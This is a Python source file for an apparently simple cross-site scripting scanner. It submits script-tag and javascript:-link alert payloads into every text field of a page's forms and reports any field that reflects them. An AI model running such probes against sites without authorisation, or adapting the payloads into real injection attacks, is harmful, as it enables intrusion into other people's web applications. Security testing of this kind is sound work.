import random
from string import ascii_lowercase

import requests
from bs4 import BeautifulSoup

from validator import validator


def scanner(base_url, url):
    session = requests.Session()
    resp = session.get(url)

    payload_types = [
        "initial",  # alert on the page opening
        "linker",  # alert on link click
    ]

    payloads = [
        {
            "payload": "<script>alert('{seed}')</script>",
            "type": payload_types[0],
        },
        {
            "payload": "<a href='javascript:alert(\"{seed}\");'>{seed}</a>",
            "type": payload_types[1],
        },
    ]

    soup = BeautifulSoup(resp.text, "html.parser")
    finder = soup.find_all("form")
    check = []
    for form in finder:
        inputs = form.find_all("input", {"type": "text"})
        texts = form.find_all("textarea")
        method = form["method"].upper()
        action = form["action"]
        all_fields = inputs + texts
        base_data = {field["name"]: field["name"] for field in all_fields}

        for field in all_fields:
            for payload in payloads:
                seed = "".join(
                    random.choice(ascii_lowercase) for i in range(16)
                )
                load = payload["payload"].format(seed=seed)
                payload_type = payload["type"]
                request_data = dict(base_data)
                request_data[field["name"]] = load

                if method == "POST":
                    resp = session.post(
                        base_url + "/" + action, data=request_data
                    )
                elif method == "GET":
                    resp = session.get(base_url + "/" + action)
                else:
                    print("Not implemented method: " + method)

                end_url = resp.url
                check.append(
                    [end_url, field, seed, load, payload_type, action]
                )

    for data in check:
        url = data[0]
        field = data[1]
        seed = data[2]
        payload = data[3]
        payload_type = data[4]
        action = data[5]

        if validator(url, seed, payload, payload_type):
            print(
                f'Success at {url} in form with action "{action}". Vulnerable param is {field} with payload {payload}.'
            )
